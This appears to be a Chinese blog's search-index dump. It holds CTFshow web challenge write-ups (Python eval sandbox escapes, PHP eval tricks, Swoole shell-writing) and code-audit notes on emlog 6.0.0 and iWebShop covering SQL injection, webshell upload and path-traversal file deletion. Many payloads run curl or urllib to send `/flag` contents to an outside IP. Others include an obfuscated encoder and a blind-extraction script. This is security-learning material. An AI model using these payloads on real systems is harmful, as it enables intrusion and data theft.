)&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None)))))))])\nstr(exec(xxx))\n\nweb444 \n这次题目给了源码\nfrom flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar):    inside_code = ord(uchar)    if inside_code == 0x3000:        inside_code = 0x0020    else:        inside_code -= 0xfee0    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e:         return uchar    return chr(inside_code)def stringQ2B(ustring):    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def app_index():    if request.method == &#x27;POST&#x27;:        code = request.form[&#x27;code&#x27;]        if code:        \tcode = stringQ2B(code)        \tif &#x27;\\\\u&#x27; in code:        \t\treturn &#x27;hacker?&#x27;        \tif &#x27;\\\\x&#x27; in code:        \t\treturn &#x27;hacker?&#x27;        \treg = re.compile(r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\\&#x27;|&quot;|\\+|[0-9]|request|len&#x27;)        \tif reg.search(code)==None:        \t\treturn eval(code)    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;if __name__==&quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80)\n主要限制即不允许Unicode或者hex编码，同时这关禁用了curl和len\n那么我们不再能直接利用len来构造数字了，python中还有bool类型的True/False也可以充当数字\ndef getNumber(num):    number = int(num)    if number in [-2, -1, 0, 1]:        return [&quot;~int(True)&quot;, &quot;~int(False)&quot;, &quot;int(False)&quot;, &quot;int(True)&quot;][number+2]    if number % 2 == 1:        return &#x27;~%s&#x27; % getNumber(~number)    else:        return &#x27;(%s&lt;&lt;(int(True)))&#x27; % getNumber(number/2)payload = &quot;import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)&quot;exp = &#x27;str().join([&#x27;for i in payload:    exp += f&quot;chr(&#123;getNumber(ord(i))&#125;),&quot;exp = exp[:-1]  # 去掉最后一个&#x27;,&#x27;exp += &#x27;])&#x27;print(exp)\n\nweb445 模块重载\n源码如下\nfrom flask import Flaskfrom flask import requestimport reimport osdel os.systemdel os.popenapp = Flask(__name__)def Q2B(uchar):    inside_code = ord(uchar)    if inside_code == 0x3000:        inside_code = 0x0020    else:        inside_code -= 0xfee0    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e:         return uchar    return chr(inside_code)def stringQ2B(ustring):    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def app_index():    if request.method == &#x27;POST&#x27;:        code = request.form[&#x27;code&#x27;]        if code:        \tcode = stringQ2B(code)        \tif &#x27;\\\\u&#x27; in code:        \t\treturn &#x27;hacker?&#x27;        \tif &#x27;\\\\x&#x27; in code:        \t\treturn &#x27;hacker?&#x27;        \treg = re.compile(r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\\&#x27;|&quot;|\\+|[0-9]|request|len&#x27;)        \tif reg.search(code)==None:        \t\treturn eval(code)    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;if __name__==&quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80)\n可以看到过滤并未增多，但是删除了os模块中的system和popen命令执行函数\n这里其实就是针对模块操作的利用了，既然删除了那么我们是可以去重载的。\n\n因此我们的利用语句为\nimport importlib;importlib.reload(os);os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)\n\nweb446\n查看源码，好的del imp.reload\n把重载函数也给我删掉了，但是俺用的是importlib\n\nweb447\n查看源码，好家伙删了更多函数\nimport subprocessdel subprocess.Popendel subprocess.calldel subprocess.rundel subprocess.getstatusoutputdel subprocess.getoutputdel subprocess.check_calldel subprocess.check_outputimport timeitdel timeit.timeit\n但是没什么卵用\n\nweb448\n源码diff部分如下\nsys.modules[&#x27;os&#x27;]=Nonesys.modules[&#x27;imp&#x27;]=Nonesys.modules[&#x27;subprocess&#x27;]=Nonesys.modules[&#x27;socket&#x27;]=Nonesys.modules[&#x27;timeit&#x27;]=Nonesys.modules[&#x27;platform&#x27;]=None\n\n字典sys.modules具有字典所拥有的一切方法，可以通过这些方法了解当前的环境加载了哪些模块\n\n那么重新修改一下值即可呗，查看一下值的规范\n\n程序在导入某个模块时，会首先查找sys.modules中是否包含此模块名，若存在，则只需将模块的名字加入到当前模块的Local名字空间中；若不存在，则需要从sys.path目录中按照模块名称查找模块文件，模块文件可以是py、pyc、pyd，找到后将模块加载到内存，并加入到sys.modules字典，最后将模块的名字加入当前模块的Local名字空间中\n\nos模块位于/usr/local/lib/python3.8/os.py\nimport sys;sys.modules[&#x27;os&#x27;]=&#x27;/usr/local/lib/ python3.8/os.py&#x27;;import os;os.system(xxx) \n或者，我们干脆直接删掉该os键，重新导入即可自动查找对应文件\nimport sys;del sys.modules[&#x27;os&#x27;];import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)\n\nweb449 \n源码diff如下\nsys.modules[&#x27;os&#x27;]=Nonesys.modules[&#x27;imp&#x27;]=Nonesys.modules[&#x27;subprocess&#x27;]=Nonesys.modules[&#x27;socket&#x27;]=Nonesys.modules[&#x27;timeit&#x27;]=Nonesys.modules[&#x27;platform&#x27;]=Nonesys.modules[&#x27;sys&#x27;]=Noneapp = Flask(__name__)sys.modules[&#x27;importlib&#x27;]=Nonedel sys\n太狠了，把sys也删掉了。那我们就不去直接命令执行了，换成文件读写。可以利用时间盲注的方式来回显\nimport requestsimport stringdb = string.ascii_lowercase + string.digits + &#x27;&#123;&#125;-&#x27;def getNumber(num):    number = int(num)    if number in [-2, -1, 0, 1]:        return [&quot;~int(True)&quot;, &quot;~int(False)&quot;, &quot;int(False)&quot;, &quot;int(True)&quot;][number+2]    if number % 2 == 1:        return &#x27;~%s&#x27; % getNumber(~number)    else:        return &#x27;(%s&lt;&lt;(int(True)))&#x27; % getNumber(number/2)def getExp(payload):    exp = &#x27;str().join([&#x27;    for i in payload:        exp += f&quot;chr(&#123;getNumber(ord(i))&#125;),&quot;    exp = exp[:-1]  # 去掉最后一个&#x27;,&#x27;    exp += &#x27;])&#x27;    return expresult = &#x27;&#x27;for i in range(100):    for w in db:        payload = f&quot;import time;f=open(&#x27;/flag&#x27;).read(&#123;i+1&#125;);time.sleep(3) if f==&#x27;&#123;w&#125;&#x27; else 1&quot;        data = &#123;            &#x27;code&#x27;: &#x27;str(exec(&#x27;+getExp(payload)+&#x27;))&#x27;        &#125;        try:            requests.post(                url=&quot;http://2bffcc80-8242-43aa-bcab-3a1a8e01a7c1.challenge.ctf.show/&quot;, data=data, timeout=1)        except:            result += w            print(result)            continue\n时间上不好控制。yu22x师傅利用的一个没被Ban的模块urllib(以前的request)\n\nurllib.request.urlopen(  url,  data=None,  [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)\n用于打开一个远程的url连接,并且向这个连接发出请求,获取响应结果。返回的结果是一个http响应对象,这个响应对象中记录了本次http访问的响应头和响应体    \n\nflag=open(&#x27;/flag&#x27;).read();import urllib;urllib.request.urlopen(&#x27;http://43.140.198.45:5000/?flag=%s&#x27; % flag)\n\nweb450 另类rce, 执行phpinfo就可以拿到flag\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-03 22:57:52# @Last Modified by:   h1xa# @Last Modified time: 2021-02-04 14:28:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#x27;ctfshow&#x27;];if(preg_match(&#x27;/^[a-z]+[\\^][a-z]+[\\^][a-z]+$/&#x27;, $ctfshow))&#123;    eval(&quot;($ctfshow)();&quot;);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15\n可以看到正则实际上是想要参数满足字母^字母^字母的形式，\n如果对于相同的变量相异或我们知道是可以抵消的，因此三个phpinfo相异或即可\nphpinfo^phpinfo^phpinfo\n\nweb451 另类rce, 执行phpinfo就可以拿到flag\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-03 22:57:52# @Last Modified by:   h1xa# @Last Modified time: 2021-02-04 15:38:05# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#x27;ctfshow&#x27;];if(preg_match(&#x27;/^[a-z]+[\\^][a-z]+[\\^][a-z]+$/&#x27;, $ctfshow))&#123;    if(!preg_match(&#x27;/phpinfo/&#x27;, $ctfshow))&#123;        eval(&quot;($ctfshow)();&quot;);    &#125;&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15\n这次不让直接出现phpinfo关键字，可以进行一下混淆\naaainfo^phpbbbb^aaabbbb\n\nweb452 另类rce, 执行phpinfo就可以拿到flag\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-03 22:57:52# @Last Modified by:   h1xa# @Last Modified time: 2021-02-04 16:05:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_GET[&#x27;ctfshow&#x27;];if(!preg_match(&#x27;/\\&#x27;|\\&quot;|[0-9]|\\&#123;|\\[|\\~|\\^|phpinfo|\\$/i&#x27;, $ctfshow))&#123;    eval($ctfshow);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15\n其实一眼是可以直接命令执行的，但是还是以构造phpinfo为主，我们可以通过拼接的方式，仿照前几题\n形式要保证($ctfshow)()左括号中的内容才会被当做动态函数处理，然后点号拼接\n((p).(h).(p).(i).(n).(f).(o))();\n\nweb453/455/456 另类rce,额，反正就是很另类的样子\n前端源码如下\n/ctf/show?s=XXX  file_get_contents($_POST[&#x27;s&#x27;])\n尝试一下直接读源码index.php\n源码如下\n$http = new Swoole\\Http\\Server(&#x27;0.0.0.0&#x27;, 80);$http-&gt;on(&#x27;start&#x27;, function ($server) &#123;    echo &quot;Swoole http server is started at http://0.0.0.0:80\\n&quot;;&#125;);$http-&gt;on(&#x27;request&#x27;, function ($request, $response) &#123;    list($controller, $action) = explode(&#x27;/&#x27;, trim($request-&gt;server[&#x27;request_uri&#x27;], &#x27;/&#x27;));    $route = array(&#x27;ctf&#x27;);    $method = array(&#x27;show&#x27;,&#x27;file&#x27;,&#x27;exec&#x27;);    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;    \t(new $controller)-&gt;$action($request, $response);    &#125;else&#123;    \t $response-&gt;end(&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\\&#x27;s\\&#x27;])--&gt;&#x27;);    &#125;    &#125;);$http-&gt;start();class ctf&#123;\tpublic function show($request,$response)&#123;\t\t $response-&gt;header(&#x27;Content-Type&#x27;, &#x27;text/html; charset=utf-8&#x27;);\t\t $s=$request-&gt;post[&#x27;s&#x27;];\t\t if(isset($s))&#123;\t\t \t$response-&gt;end(file_get_contents($s));\t\t &#125;else&#123;\t\t \t$response-&gt;end(&#x27;s not found&#x27;);\t\t &#125;\t&#125;\tpublic function file($request,$response)&#123; \t\t $response-&gt;header(&#x27;Content-Type&#x27;, &#x27;text/html; charset=utf-8&#x27;);\t\t $s=$request-&gt;post[&#x27;s&#x27;];\t\t if(isset($s))&#123;\t\t \tfile_put_contents(&#x27;shell.php&#x27;, $s);\t\t \t$response-&gt;end(&#x27;file write done in /var/www/shell.php&#x27;);\t\t &#125;else&#123;\t\t \t$response-&gt;end(&#x27;s not found&#x27;);\t\t &#125;\t&#125;\tpublic function exec($request,$response)&#123;\t\tsystem(&#x27;php shell.php&#x27;);\t\t$response-&gt;end(&#x27;command exec done&#x27;);\t&#125;&#125;\n首先看到这个ctf类是可以利用的，而http Server根据路由来执行对应的函数.路由是怎么产生的呢？通过对url按照斜线分隔开\n那就好说了，先写恶意代码。由于没有回显，所以我们得外带\n&lt;?php system(&#x27;curl http://43.140.198.45:5000/?flag=`cat fl*`&#x27;); ?&gt;# 路由/ctf/file\n然后执行\n/ctf/exec\n\nweb454 另类rce,额，还可以这样子\n还是先读一下源码\n$http = new Swoole\\Http\\Server(&#x27;0.0.0.0&#x27;, 80);$http-&gt;on(&#x27;start&#x27;, function ($server) &#123;    echo &quot;Swoole http server is started at http://0.0.0.0:80\\n&quot;;&#125;);$http-&gt;on(&#x27;request&#x27;, function ($request, $response) &#123;    list($controller, $action) = explode(&#x27;/&#x27;, trim($request-&gt;server[&#x27;request_uri&#x27;], &#x27;/&#x27;));    $route = array(&#x27;ctf&#x27;);    $method = array(&#x27;show&#x27;,&#x27;file&#x27;,&#x27;include&#x27;);    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;    \t(new $controller)-&gt;$action($request, $response);    &#125;else&#123;    \t $response-&gt;end(&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\\&#x27;s\\&#x27;])--&gt;&#x27;);    &#125;    &#125;);$http-&gt;start();class ctf&#123;\tpublic function show($request,$response)&#123;\t\t $response-&gt;header(&#x27;Content-Type&#x27;, &#x27;text/html; charset=utf-8&#x27;);\t\t $s=$request-&gt;post[&#x27;s&#x27;];\t\t if(isset($s))&#123;\t\t \t$response-&gt;end(file_get_contents($s));\t\t &#125;else&#123;\t\t \t$response-&gt;end(&#x27;s not found&#x27;);\t\t &#125;\t&#125;\tpublic function file($request,$response)&#123; \t\t $response-&gt;header(&#x27;Content-Type&#x27;, &#x27;text/html; charset=utf-8&#x27;);\t\t $s=$request-&gt;post[&#x27;s&#x27;];\t\t if(isset($s))&#123;\t\t \tfile_put_contents(&#x27;shell.php&#x27;, $s);\t\t \t$response-&gt;end(&#x27;file write done in /var/www/shell.php&#x27;);\t\t &#125;else&#123;\t\t \t$response-&gt;end(&#x27;s not found&#x27;);\t\t &#125;\t&#125;\tpublic function include($request,$response)&#123;\t\tinclude(&#x27;shell.php&#x27;);\t\t$response-&gt;end(&#x27;include done&#x27;);\t&#125;&#125;\n可以看到最后执行的方法名换成了include，其他没变化\n\nweb457 逻辑好乱鸭\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-06 01:58:32# @Last Modified by:   h1xa# @Last Modified time: 2021-02-06 12:19:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#x27;flag.php&#x27;);abstract class user&#123;    public  $username;    public  $password;    function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    abstract  public  function check();&#125;class visitor extends user&#123;    public  function check()&#123;        return ($this-&gt;username!==&#x27;admin&#x27; &amp;&amp; $this-&gt;password!==&#x27;admin888&#x27;);    &#125;&#125;class admin extends user&#123;    public  function check()&#123;        $u= call_user_func($this-&gt;password);        return $u==&#x27;admin&#x27;;    &#125;&#125;$u=$_GET[&#x27;u&#x27;];$p=$_GET[&#x27;p&#x27;];if(isset($u)&amp;&amp;isset($p))&#123;    if((new visitor($u,$p))-&gt;check())&#123;        die(&#x27;welcome visitor :&#x27;.$u);    &#125;    if((new admin($u,$p))-&gt;check())&#123;        die(&#x27;welcome admin :&#x27;.$u.&#x27; flag is :&#x27;.$flag);    &#125;&#125;\n首先判断了visitor的check，也就是username必须得是admin或password必须是admin888我们才能绕过。\nadmin的check中call_user_func会调用参数password对应的值作为匿名函数，并且返回值存在弱类型比较，因此利用call_user_func调用返回true之类的函数即可即可\n\nu=admin&amp;p=phpinfo\n\nweb458 逻辑好乱呀\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-06 01:58:32# @Last Modified by:   h1xa# @Last Modified time: 2021-02-06 12:19:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#x27;flag.php&#x27;);abstract class user&#123;    public  $username;    public  $password;    function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    abstract  public  function check();&#125;class visitor extends user&#123;    public  function check()&#123;        return ($this-&gt;username!==&#x27;admin&#x27; &amp;&amp; $this-&gt;password!==&#x27;admin888&#x27;);    &#125;&#125;class admin extends user&#123;    public  function check()&#123;        $u= call_user_func($this-&gt;password);        return $u===&#x27;admin&#x27;;    &#125;&#125;$u=$_GET[&#x27;u&#x27;];$p=$_GET[&#x27;p&#x27;];if(isset($u)&amp;&amp;isset($p))&#123;    if((new visitor($u,$p))-&gt;check())&#123;        die(&#x27;welcome visitor :&#x27;.$u);    &#125;    if((new admin($u,$p))-&gt;check())&#123;        die(&#x27;welcome admin :&#x27;.$u.&#x27; flag is :&#x27;.$flag);    &#125;&#125;\n这里admin的check函数存在一个强类型比较了，因此这里应该调用一个void类型的匿名函数。y4给的思路是利用php的反射函数\nget_class(): 获取当前调用方法的类名； - 如果在类中省略 object， 则返回当前所在类的名称get_called_class():获取静态绑定后的类名；返回类的名称，如果不是在类中调用则返回 false\n那么也就是说我们在admin类实例对象的check方法中调用get_class的话即可返回对应的类名admin，满足了比较条件\nu=admin&amp;p=get_class\n\nweb459 小清新\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-02-06 01:58:32# @Last Modified by:   h1xa# @Last Modified time: 2021-02-06 13:25:16# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#x27;flag.php&#x27;);$u=$_GET[&#x27;u&#x27;];$p=$_GET[&#x27;p&#x27;];if(isset($u)&amp;&amp;isset($p))&#123;    copy($u, $p.&#x27;.php&#x27;);\n我们直接copy会存在因为后缀是php可解析文件导致一些注释内容不可见的影响，注意copy文件是支持伪协议的，因此即可直接\nu=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1\n\nweb460 小清新\n题目给了源码，啊这又来了\nfrom flask import Flaskfrom flask import requestimport reimport sys from func_timeout import func_set_timeoutimport timeimport func_timeoutimport randomsys.modules[&#x27;os&#x27;]=Nonesys.modules[&#x27;imp&#x27;]=Nonesys.modules[&#x27;subprocess&#x27;]=Nonesys.modules[&#x27;socket&#x27;]=Nonesys.modules[&#x27;timeit&#x27;]=Nonesys.modules[&#x27;platform&#x27;]=Nonesys.modules[&#x27;sys&#x27;]=Noneapp = Flask(__name__)sys.modules[&#x27;importlib&#x27;]=Nonedel sys@func_set_timeout(0.7)def run(s):    time.sleep(randmon.random())    return eval(s)def Q2B(uchar):    inside_code = ord(uchar)    if inside_code == 0x3000:        inside_code = 0x0020    else:        inside_code -= 0xfee0    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e:         return uchar    return chr(inside_code)def stringQ2B(ustring):    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def app_index():    if request.method == &#x27;POST&#x27;:        code = request.form[&#x27;code&#x27;]        if code:            code = stringQ2B(code)            if &#x27;\\\\u&#x27; in code:                return &#x27;hacker?&#x27;            if &#x27;\\\\x&#x27; in code:                return &#x27;hacker?&#x27;            reg = re.compile(r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\\&#x27;|&quot;|\\+|[0-9]|request|len&#x27;)            if reg.search(code)==None:                try:                    s=run(code)                    return s                except func_timeout.exceptions.FunctionTimedOut:                    return exec(&#x27;1&#x27;)    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;if __name__==&quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=8080)\nflag=open(&#x27;/flag&#x27;).read();import urllib;urllib.request.urlopen(f&#x27;http://43.140.198.45:5000/?flag=&#123;flag&#125;&#x27;)\n和之前的题一样，编码混淆绕过\n\n\n参考：\nhttps://blog.csdn.net/solitudi/article/details/113778651\nhttps://blog.csdn.net/miuzzx/article/details/110220425\nhttps://blog.csdn.net/miuzzx/article/details/112692697\nhttps://sirbei.com/index.php/archives/597/\n","tags":["ctfshow"]},{"title":"跟着Y4师傅学代码审计-emlog_6.0.0","url":"/2022/12/14/emlog%E5%88%86%E6%9E%90/","content":"写在前面这是代码审计练习的第七篇。上一篇感觉难度有些大，虽说没有框架但是自己设计的WAF防不胜防。这一篇练习emlog 6.0.0，希望能来点惊喜\n漏洞分析sql注入1\n位于admin/comment.php下，对ip并没有进行过滤\n\n并且值得注意的是，这里离checkToken会去校验一下用户认证，token可以通过用户传参进来验证\n\n本身token的生成其实没有问题，想要爆破很困难\n\n但是其token值却被放到了表单这些地方，势必存在安全隐患，例如XSS可以偷\n\n继续看注入部分，跟进可以看到ip直接拼接\n\n文件上传\n位于后台插件功能处\n\n定位路由至/admin/plugin.php?action=upload_zip\n\n如果我上传一个恶意的zip包，可以看到出现回显\n\n定位至view视图\n\n对应之前的分支为-1\n\n跟进emUnZip()看看为啥是-1\n首先可以看到回显获取一个dir作为目录（第一个条目的名字）并拼接/\n之后会拼接plugin_name，后者是截取的dir全部名字，最后带上php。\n\n最后会将抽离的文件移动到../content/plugins/处\n\n因此我们需要一个同名文件夹用来承载恶意文件，最后压缩上传即可\n访问即可验证\n\n任意文件删除1\n还是在刚才的admin/data.php处，没啥好说的，提交就删\n\n任意文件删除2\n位于后台插件删除处，对应路由/admin/plugin.php?action=del&amp;plugin=tips/tips.php\n可以看到如果能成功删除文件的话就会回显302./plugin.php?activate_del=1\n\n关键在与能否绕过正则匹配\n\n经过测试只要开头是/则可以绕过正则替换\nplugin=/../../robots.txt\n这样也就是会拼接得到../content/plugins//../../robots.txt linux下则可以顺利删除掉根目录下的robots.txt文件\n无惊喜，洞蛮多的，不过都被挖干净了\n","tags":["代码审计"]},{"title":"Hello World","url":"/2022/07/05/hello-world/","content":"this is a test page","tags":["test"]},{"title":"跟着Y4师傅学代码审计-iWebShop开源商城系统","url":"/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/","content":"写在前面这个是代码审计练习分析的第八篇文章，阳了几天断更了，最近恢复了些状态开始重新计划\n这篇分析iWebShop5.9\n漏洞分析整个命令执行的利用需要结合SQL注入、任意文件删除和命令执行拼接漏洞\n后台添加一个商户账户\n\n访问商户对应的商家管理页面，url如下\n\n\n添加一个普通的商品，方便后续SQL注入的利用\n\n然后回到后台利用经典的数据库备份功能，备份关键的三个表iwebphp.iwebshop_goods_photo_relation iwebphp.iwebshop_goods_photo 以及 iwebphp.iwebshop_goods\n\n下载好备份sql文件，我们可以在其上增加一些利用信息，关注iwebshop_goods_photo 表的img字段，我们在其上可以选中任意文件。另外需要注意id之间的关系\n\n之后回到后台数据库恢复功能，上传该修改的sql文件，并执行\n\n我们根据路由信息定位至tools.php中的localUpload方法，其中可以看到，对上传的文件调用parseSQL()方法\n\n里面只判断了一个文件前两个字符，由于第一行为DROP xxx，因此默认就会执行后续语句，逐个语句去调用query()方法\n\n可以看到其间没有任何过滤字符就执行了SQL语句，造成SQL注入漏洞\n//执行SQL\tfunction query($sql)\t&#123;\t\t//创建数据库对象\t\t$dbObj = 